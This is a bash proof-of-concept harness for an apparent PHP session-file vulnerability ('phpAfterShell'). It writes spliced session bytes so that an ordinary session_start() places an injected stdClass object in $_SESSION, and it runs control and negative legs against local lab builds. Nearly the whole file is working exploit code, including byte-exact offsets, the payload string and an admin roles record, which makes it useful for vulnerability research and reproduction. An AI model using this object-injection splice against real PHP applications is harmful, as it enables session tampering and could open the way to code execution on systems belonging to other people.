#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) consumer-side splice demo.
#
# Spec sources:
#   - GHSA-fm2m-fjf5-v3cp (vendor advisory, 2026-11-19): ps_files_write() does
#     NOT clear the old session before writing the replacement; an interrupted
#     write leaves prefix-of-new + tail-of-old, which the session decoder can
#     interpret as a THIRD valid session with different meaning.
#   - depthfirst "phpAfterShell" (2026-11-19): documents the post-kill file
#     geometry  file = R[0:k] || C[k:]  with the carrier C holding the target
#     object INERT inside a long string, and the decoder landing on those
#     bytes as a new top-level session record.
#   - Both lab builds are in the vendor's affected range (>= 8.4.0 < 8.4.28);
#     source check: mod_files.c ps_files_write() truncates only when
#     len(R) < st_size, then a single pwrite() at offset 0 (no atomicity).
#
# This harness demonstrates the CONSUMER half deterministically: it writes the
# post-interruption bytes to sess_<SID> and shows a plain session_start()
# promoting the object into $_SESSION. It does NOT reproduce the producer
# (interrupted pwrite) — that is a separate harness.
#
# Geometry (offsets byte-exact; observed correction: the php session decoder
# REQUIRES the '";' string terminator — a splice landing mid-string destroys
# the session (kept as a negative leg below). The working splice aligns a
# RECORD BOUNDARY of the replacement prefix with the byte offset where the
# object bytes begin inside the carrier's long string):
#   OBJ   = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'   (48 bytes:
#           'evil|'=5, 'O:8:"stdClass":1:{'=18, 's:5:"proof";'=12,
#           's:5:"pwned";'=12, '}'=1)
#   K     = 100 (kill offset / record boundary)
#   PAD1  = 88 x 'A'    PAD2 = 32 x 'B'   -> carrier payload = 88+48+32 = 168
#   C     = 'data|s:168:"' (12-byte header) + PAD1 OBJ PAD2 + '";' + ROLES
#           -> OBJ begins at byte offset 12+88 = 100 = K
#   RP    = 'data|s:86:"' + 86 x 'X' + '";'  = exactly 100 bytes, one
#           COMPLETE record (the replacement session's first K bytes)
#   MIX   = RP || C[K:]  == file state after a kill at k=K:
#           [complete replacement record] + [OBJ as a top-level record] +
#           PAD2 '";' ROLES
#   Decode of MIX: key 'data' = 86 X's; then 'evil|O:8:"stdClass":...' creates
#   $_SESSION['evil'] = stdClass{proof:"pwned"}; trailing PAD2+'";'+ROLES
#   decodes as a junk-named key holding the roles array (no error at all).
#
# Legs per build:
#   control-C  : carrier alone  -> evil absent, data = 168-byte string
#   control-R  : replacement alone (completed, un-interrupted write)
#                                -> evil absent
#   splice-MID : naive mid-string cut (no '";' terminator) -> decode fails,
#                session destroyed, evil null (observed NEGATIVE)
#   splice-MIX : post-kill state (record boundary K=100 || C[100:])
#                                -> $_SESSION['evil'] LIVE stdClass
#
# Usage: bash lab/repro/php2shell-aftershell-splice-consumer.sh <php-cli-bin> [outdir]
#   php-cli-bin: lab/build/php-<ver>-<mode>/sapi/cli/php

set -u
PHP=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(basename "$(dirname "$(dirname "$(dirname "$1")")")" | sed 's/^php-//')
mkdir -p "$OUT"
LOG="$OUT/aftershell-splice-$LABEL.log"
: > "$LOG"

D=$(mktemp -d)
trap 'rm -rf "$D"' EXIT
SESS="$D/sess"; mkdir -p "$SESS"

PAD1=$(head -c 88 /dev/zero | tr '\0' 'A')
PAD2=$(head -c 32 /dev/zero | tr '\0' 'B')
OBJ='evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
ROLES='roles|a:1:{i:0;s:5:"admin";}'
RP="data|s:86:\"$(head -c 86 /dev/zero | tr '\0' 'X')\";"

C="data|s:168:\"${PAD1}${OBJ}${PAD2}\";${ROLES}"
MIX="${RP}${OBJ}${PAD2}\";${ROLES}"
MID="data|s:64:\"${PAD1}${OBJ}${PAD2}\";${ROLES}"
R="${RP}roles|a:0:{}"

run_leg() { # $1=label $2=bytes
    rm -f "$SESS"/sess_*
    printf '%s' "$2" > "$SESS/sess_aftershell"
    echo "---- $1" >> "$LOG"
    echo "    file: $(head -c 80 "$SESS/sess_aftershell")..." >> "$LOG"
    "$PHP" \
        -d session.save_path="$SESS" \
        -d session.serialize_handler=php \
        -d session.upload_progress.enabled=0 \
        -n -r 'session_id("aftershell");
session_start();
echo "EVIL="; var_dump($_SESSION["evil"] ?? null);
echo "DATALEN="; var_dump(isset($_SESSION["data"]) ? strlen($_SESSION["data"]) : null);' \
        >> "$LOG" 2>&1
    echo "    rc=$?" >> "$LOG"
}

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=1
export UBSAN_OPTIONS=halt_on_error=1:print_stacktrace=1

run_leg "control-C (carrier session, object bytes inert)" "$C"
run_leg "control-R (completed replacement write, no kill)" "$R"
run_leg "splice-MID (naive mid-string cut, no terminator)" "$MID"
run_leg "splice-MIX (post-kill state: record boundary K=100 || C[100:])" "$MIX"

echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG"; then
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG"
fi
# per-leg classification: EVIL= is echoed; var_dump follows on the next line
awk '/^---- /{leg=$2} /^EVIL=/{getline; gsub(/^[ \t]+/,""); print leg": "$0}' "$LOG" |
    sed 's/object(stdClass).*/EVIL=live-object/; s/NULL.*/EVIL=null/' | sort -u
exit 0
